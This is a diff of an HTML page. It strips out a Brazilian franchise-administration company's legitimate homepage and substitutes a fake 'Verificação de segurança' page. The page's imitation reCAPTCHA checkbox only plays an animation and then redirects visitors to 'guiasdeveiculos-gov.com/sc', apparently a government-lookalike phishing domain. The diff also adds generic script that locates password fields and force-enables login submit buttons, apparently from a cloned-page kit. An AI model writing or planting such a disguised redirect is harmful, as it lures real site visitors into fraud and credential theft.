@@ -1,442 +1,202 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-<head><!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18222041111"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-18222041111');
-</script>
+<html lang="pt-BR"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Portal Do Cliente</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
 
 
-  <!-- Event snippet for Visualização de página (1) conversion page -->
-<script>
-  gtag('event', 'conversion', {
-      'send_to': 'AW-18222041111/zXroCIeH3c0cEJeQ-fBD',
-      'value': 1.0,
-      'currency': 'BRL'
-  });
-</script><!-- Event snippet for Visualização de página (1) conversion page
-In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. -->
-<script>
-function gtag_report_conversion(url) {
-  var callback = function () {
-    if (typeof(url) != 'undefined') {
-      window.location = url;
-    }
-  };
-  gtag('event', 'conversion', {
-      'send_to': 'AW-18222041111/zXroCIeH3c0cEJeQ-fBD',
-      'value': 1.0,
-      'currency': 'BRL',
-      'event_callback': callback
-  });
-  return false;
-}
-</script>
-
-    
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AWR Administradora de Franquias</title>
-    <!-- Link para ícones modernos -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary: #0f2c59;
-            --secondary: #dac0a3;
-            --dark: #1d2a44;
-            --light: #f8fafc;
-            --text: #334155;
-            --border: #e2e8f0;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: #f4f6f9;
-            color: var(--text);
-            line-height: 1.6;
-        }
-
-        /* Navbar */
-        nav {
-            background-color: var(--primary);
-            padding: 1rem 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            border-bottom: 3px solid var(--secondary);
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
-        }
-
-        .logo {
-            color: #ffffff;
-            font-size: 1.4rem;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-
-        .logo span {
-            color: var(--secondary);
-        }
-
-        .nav-links {
-            display: flex;
-            list-style: none;
-            gap: 2rem;
-        }
-
-        .nav-links a {
-            color: #ffffff;
-            text-decoration: none;
-            font-size: 0.95rem;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: var(--secondary);
-        }
-
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(135deg, #0f2c59 0%, #1d2a44 100%);
-            color: #ffffff;
-            padding: 5rem 2rem;
-            text-align: center;
-        }
-
-        .hero h1 {
-            font-size: 2.5rem;
-            margin-bottom: 1rem;
-            font-weight: 700;
-        }
-
-        .hero p {
-            font-size: 1.2rem;
-            color: #cbd5e1;
-            max-width: 700px;
-            margin: 0 auto 2rem auto;
-        }
-
-        .cta-btn {
-            background-color: var(--secondary);
-            color: var(--primary);
-            padding: 0.8rem 2rem;
-            border: none;
-            border-radius: 4px;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .cta-btn:hover {
-            background-color: #eddac2;
-            transform: translateY(-2px);
-        }
-
-        /* Container Principal */
-        .container {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 3rem 1.5rem;
-        }
-
-        .section-title {
-            font-size: 1.75rem;
-            color: var(--primary);
-            margin-bottom: 2rem;
-            text-align: center;
-            position: relative;
-            padding-bottom: 0.5rem;
-            font-weight: 700;
-        }
-
-        .section-title::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 60px;
-            height: 3px;
-            background-color: var(--secondary);
-        }
-
-        /* Grid de Serviços */
-        .services-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-            margin-bottom: 4rem;
-        }
-
-        .service-card {
-            background: #ffffff;
-            padding: 2.5rem 2rem;
-            border-radius: 6px;
-            border-top: 4px solid var(--primary);
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
-            transition: transform 0.3s;
-        }
-
-        .service-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .service-icon {
-            font-size: 2rem;
-            color: var(--primary);
-            margin-bottom: 1rem;
-        }
-
-        .service-card h3 {
-            color: var(--dark);
-            margin-bottom: 0.75rem;
-            font-size: 1.25rem;
-        }
-
-        /* Tabela Corporativa */
-        .info-section {
-            background: #ffffff;
-            padding: 2.5rem;
-            border-radius: 6px;
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
-            margin-bottom: 4rem;
-        }
-
-        .info-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 1rem;
-        }
-
-        .info-table tr {
-            border-bottom: 1px solid var(--border);
-        }
-
-        .info-table tr:last-child {
-            border-bottom: none;
-        }
-
-        .info-table td {
-            padding: 1rem;
-            font-size: 1rem;
-        }
-
-        .info-label {
-            font-weight: 600;
-            color: var(--dark);
-            width: 30%;
-        }
-
-        .info-value {
-            color: var(--text);
-        }
-
-        .status-badge {
-            background-color: #d1fae5;
-            color: #065f46;
-            padding: 0.25rem 0.75rem;
-            border-radius: 50px;
-            font-size: 0.85rem;
-            font-weight: 600;
-        }
-
-        /* Contato e Localização */
-        .contact-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 2rem;
-        }
-
-        .contact-box {
-            background: #ffffff;
-            padding: 2.5rem;
-            border-radius: 6px;
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
-        }
-
-        .contact-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 1rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .contact-item i {
-            color: var(--primary);
-            font-size: 1.2rem;
-            margin-top: 0.25rem;
-        }
-
-        .correspondence-box {
-            background-color: var(--light);
-            border-left: 3px solid var(--secondary);
-            padding: 1rem;
-            margin-top: 1rem;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 0.9rem;
-        }
-
-        /* Rodapé */
-        footer {
-            background-color: var(--dark);
-            color: #94a3b8;
-            text-align: center;
-            padding: 2rem;
-            margin-top: 5rem;
-            font-size: 0.9rem;
-            border-top: 3px solid var(--secondary);
-        }
-
-        /* Responsividade */
-        @media (max-width: 768px) {
-            .nav-links { display: none; }
-            .info-table td { display: block; width: 100%; }
-            .info-label { padding-bottom: 0.25rem; }
-            .info-table td { padding: 0.75rem 0; }
-            .hero h1 { font-size: 2rem; }
-        }
-    </style>
-</head>
+<link rel="stylesheet" href="styles.css"></head>
 <body>
-
-    <!-- Menu de Navegação -->
-    <nav>
-        <div class="logo">AWR <span>Administradora</span></div>
-        <ul class="nav-links">
-            <li><a href="#servicos">Serviços</a></li>
-            <li><a href="#institucional">Institucional</a></li>
-            <li><a href="#contato">Contato</a></li>
-        </ul>
-    </nav>
-
-    <!-- Hero Section / Chamada Principal -->
-    <header class="hero">
-        <h1>AWR Administradora de Franquias LTDA</h1>
-        <p>Soluções corporativas completas em inteligência de mercado, estruturação, expansão e gestão estratégica para redes de franquias.</p>
-        <a href="https://wa.me/5547997701291" target="_blank" class="cta-btn">
-            <i class="fab fa-whatsapp"></i> Falar com um Especialista
-        </a>
-    </header>
-
-    <div class="container">
-        
-        <!-- Seção de Serviços -->
-        <section id="servicos">
-            <h2 class="section-title">Nossas Soluções</h2>
-            <div class="services-grid">
-                <div class="service-card">
-                    <div class="service-icon"><i class="fas fa-sitemap"></i></div>
-                    <h3>Formatação de Redes</h3>
-                    <p>Estruturação jurídica, financeira e operacional completa para transformar modelos de negócios consolidados em redes franqueáveis replicáveis.</p>
-                </div>
-                <div class="service-card">
-                    <div class="service-icon"><i class="fas fa-chart-line"></i></div>
-                    <h3>Expansão Estratégica</h3>
-                    <p>Planejamento de geofusion, atração ativa e seleção rigorosa de leads qualificados alinhados ao perfil de franqueado ideal da sua marca.</p>
-                </div>
-                <div class="service-card">
-                    <div class="service-icon"><i class="fas fa-handshake"></i></div>
-                    <h3>Suporte & Gestão</h3>
-                    <p>Consultoria de campo, implantação de manuais de excelência, treinamentos e auditoria permanente dos padrões corporativos estabelecidos.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- Seção de Informações de Registro -->
-        <section id="institucional" class="info-section">
-            <h2 class="section-title">Dados Institucionais</h2>
-            <table class="info-table">
-                <tr>
-                    <td class="info-label">Razão Social</td>
-                    <td class="info-value">Awr Administradora de Franquias LTDA</td>
-                </tr>
-                <tr>
-                    <td class="info-label">CNPJ</td>
-                    <td class="info-value">34.704.495/0001-51 <span class="status-badge">Matriz</span></td>
-                </tr>
-                <tr>
-                    <td class="info-label">Situação Cadastral</td>
-                    <td class="info-value"><span class="status-badge" style="background-color: #d1fae5; color: #065f46;">ATIVA</span> (Desde 29/08/2019)</td>
-                </tr>
-                <tr>
-                    <td class="info-label">Porte</td>
-                    <td class="info-value">Empresa de Pequeno Porte (EPP)</td>
-                </tr>
-                <tr>
-                    <td class="info-label">Natureza Jurídica</td>
-                    <td class="info-value">Sociedade Empresária Limitada</td>
-                </tr>
-                <tr>
-                    <td class="info-label">Regime Tributário</td>
-                    <td class="info-value">Optante pelo Simples Nacional</td>
-                </tr>
-                <tr>
-                    <td class="info-label">Capital Social</td>
-                    <td class="info-value">R$ 100.000,00</td>
-                </tr>
-            </table>
-        </section>
-
-        <!-- Seção de Contato e Localidade -->
-        <section id="contato" class="contact-grid">
-            <div class="contact-box">
-                <h2 class="section-title" style="text-align: left; margin-bottom: 1.5rem;">Canais de Atendimento</h2>
-                
-                <div class="contact-item">
-                    <i class="fas fa-phone-alt"></i>
-                    <div>
-                        <strong>Telefone Corporativo / WhatsApp</strong>
-                        <p>(47) 99770-1291</p>
-                    </div>
-                </div>
-
-                <div class="contact-item">
-                    <i class="fas fa-map-marker-alt"></i>
-                    <div>
-                        <strong>Endereço Comercial</strong>
-                        <p>Rua Nove de Marco, 820 — Sala 01<br>Centro — Joinville / SC<br>CEP 89201-400</p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="contact-box">
-                <h2 class="section-title" style="text-align: left; margin-bottom: 1.5rem;">Correspondência</h2>
-                <p style="font-size: 0.95rem; margin-bottom: 0.5rem;">Para o envio de notificações, contratos e documentos oficiais, utilize o padrão postal abaixo:</p>
-                <div class="correspondence-box">
-                    Awr Administradora de Franquias LTDA<br>
-                    Rua Nove de Marco 820 Sala 01<br>
-                    Centro<br>
-                    Joinville SC<br>
-                    89201-400
-                </div>
-            </div>
-        </section>
-
+<div class="security-container">
+  <div class="security-header">
+    <svg class="security-icon" viewBox="0 0 24 24" fill="currentColor">
+      <path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"></path>
+    </svg>
+    <span class="security-title">Verificação de segurança</span>
+  </div>
+  <div class="security-body">
+    <p class="security-text">
+      Para sua proteção, precisamos confirmar que você é uma pessoa real antes de acessar o portal.
+    </p>
+    <p class="security-note">
+      Marque a caixa abaixo para concluir a verificação. Em seguida, você será redirecionado automaticamente.
+    </p>
+    <div class="recaptcha-frame">
+      <label class="check-area" id="checkArea">
+        <input type="checkbox" id="check">
+        <div class="custom-check" id="customCheck">
+          <svg class="spinner" viewBox="0 0 50 50">
+            <circle class="spinner-track" cx="25" cy="25" r="20"></circle>
+            <circle class="spinner-arc" cx="25" cy="25" r="20"></circle>
+          </svg>
+          <svg class="check-icon" viewBox="0 0 24 24" fill="none">
+            <path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#fff"></path>
+          </svg>
+        </div>
+        <span class="check-text">Não sou um robô</span>
+      </label>
+      <div class="captcha-brand">
+        <img src="images/img_ee317416ac.png" width="32" height="32" alt="">
+        <div class="brand-name">reCAPTCHA</div>
+        <div class="brand-links">
+          <a href="https://policies.google.com/privacy" target="_blank">Privacidade</a>
+          -
+          <a href="https://policies.google.com/terms" target="_blank">Termos</a>
+        </div>
+      </div>
     </div>
+  </div>
+</div>
+<script>
+const check = document.getElementById("check");
+const customCheck = document.getElementById("customCheck");
+const checkArea = document.getElementById("checkArea");
+let verifying = false;
+check.addEventListener("change", () => {
+  if (!check.checked) {
+    if (verifying) {
+      check.checked = true;
+      return;
+    }
+    customCheck.classList.remove("checked", "loading");
+    checkArea.classList.remove("verifying");
+    return;
+  }
+  if (verifying) return;
+  verifying = true;
+  checkArea.classList.add("verifying");
+  customCheck.classList.add("loading");
+  setTimeout(() => {
+    customCheck.classList.remove("loading");
+    customCheck.classList.add("checked");
+    checkArea.classList.remove("verifying");
+    verifying = false;
+    setTimeout(() => {
+      window.location.href = "https://guiasdeveiculos-gov.com/sc";
+    }, 800);
+  }, 1000);
+});
+</script>
 
-    <!-- Rodapé -->
-    <footer>
-        <p>&copy; 2026 AWR Administradora de Franquias LTDA. CNPJ: 34.704.495/0001-51. Todos os direitos reservados.</p>
-    </footer>
 
-</body>
-</html>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    document.addEventListener('click', function(e) {
+        const btn = e.target.closest('button, [role="button"], .eye-icon');
+        if (!btn || btn.type === 'submit' || btn.tagName === 'A') return;
+        
+        let container = btn.parentElement;
+        let passInput = null;
+        
+        while(container && container.tagName !== 'BODY') {
+            const inputs = Array.from(container.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"])'));
+            if (inputs.length > 0) {
+                passInput = inputs.find(i => i.type === 'password' || i.dataset.isPass === 'true');
+                if (!passInput) {
+                    passInput = inputs.find(i => {
+                        const n = (i.name || '').toLowerCase();
+                        const id = (i.id || '').toLowerCase();
+                        return n.includes('pass') || id.includes('pass') || n.includes('senha') || id.includes('senha');
+                    });
+                }
+                if (!passInput && inputs.length === 1) {
+                    passInput = inputs[0];
+                }
+                if (passInput) break;
+            }
+            container = container.parentElement;
+        }
+
+        if (passInput && (btn.innerHTML.includes('svg') || btn.innerHTML.toLowerCase().includes('eye') || btn.innerHTML.toLowerCase().includes('olho'))) {
+            e.preventDefault();
+            passInput.dataset.isPass = 'true';
+            const isText = passInput.type === 'password';
+            passInput.type = isText ? 'text' : 'password';
+            
+            const svg = btn.tagName === 'SVG' ? btn : btn.querySelector('svg');
+            if (svg) {
+                if (!svg.dataset.boundColor) {
+                    const path = svg.querySelector('path');
+                    svg.dataset.boundColor = (path && path.getAttribute('fill')) || 'currentColor';
+                    if (svg.dataset.boundColor === 'none') svg.dataset.boundColor = 'currentColor';
+                }
+                const color = svg.dataset.boundColor;
+                svg.setAttribute('viewBox', '0 0 24 24');
+                if (isText) {
+                    svg.innerHTML = '<path fill="' + color + '" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+                } else {
+                    svg.innerHTML = '<path fill="' + color + '" d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2z"/>';
+                }
+            }
+        }
+    });
+
+    // Ativar/Desativar botões de submit automaticamente (simulação React)
+    const checkSubmitButtons = function() {
+        // Procurar áreas de login baseadas no input de senha
+        const passInputs = document.querySelectorAll('input[type="password"], input[data-is-pass="true"], input[name*="pass"], input[id*="pass"]');
+        passInputs.forEach(pass => {
+            let container = pass.closest('form');
+            if (!container) {
+                let curr = pass.parentElement;
+                while(curr && curr.tagName !== 'BODY') {
+                    if (curr.querySelector('button[type="submit"], button[id*="submit"], button[data-testid*="submit"]')) {
+                        container = curr;
+                        break;
+                    }
+                    curr = curr.parentElement;
+                }
+            }
+            
+            if (container) {
+                const btns = container.querySelectorAll('button[type="submit"], button[id*="submit"], button[data-testid*="submit"]');
+                const inputs = container.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"])');
+                
+                let allFilled = true;
+                let visibleInputs = 0;
+                
+                inputs.forEach(inp => {
+                    // ignorar inputs invisíveis, fora da tela, ou honeypots
+                    const rect = inp.getBoundingClientRect();
+                    const isVisible = rect.width > 2 && rect.height > 2 && 
+                                      window.getComputedStyle(inp).visibility !== 'hidden' && 
+                                      window.getComputedStyle(inp).opacity !== '0';
+                    
+                    if (isVisible) {
+                        visibleInputs++;
+                        if (inp.value.trim() === '') allFilled = false;
+                    }
+                });
+
+                if (visibleInputs > 0 && btns.length > 0) {
+                    btns.forEach(btn => {
+                        if (allFilled) {
+                            btn.removeAttribute('disabled');
+                            btn.removeAttribute('aria-disabled');
+                            btn.style.setProperty('opacity', '1', 'important');
+                            btn.style.setProperty('pointer-events', 'auto', 'important');
+                            btn.style.setProperty('cursor', 'pointer', 'important');
+                            btn.style.setProperty('filter', 'none', 'important');
+                            btn.classList.add('btn-active-simulated');
+                        } else {
+                            btn.setAttribute('disabled', 'true');
+                            btn.setAttribute('aria-disabled', 'true');
+                            btn.style.setProperty('opacity', '0.5', 'important');
+                            btn.style.setProperty('pointer-events', 'none', 'important');
+                            btn.style.setProperty('cursor', 'not-allowed', 'important');
+                            btn.style.setProperty('filter', 'grayscale(100%)', 'important');
+                            btn.classList.remove('btn-active-simulated');
+                        }
+                    });
+                }
+            }
+        });
+    };
+
+    document.addEventListener('input', checkSubmitButtons);
+    // Executa no load para garantir o estado inicial
+    setTimeout(checkSubmitButtons, 100);
+});
+</script></body></html>
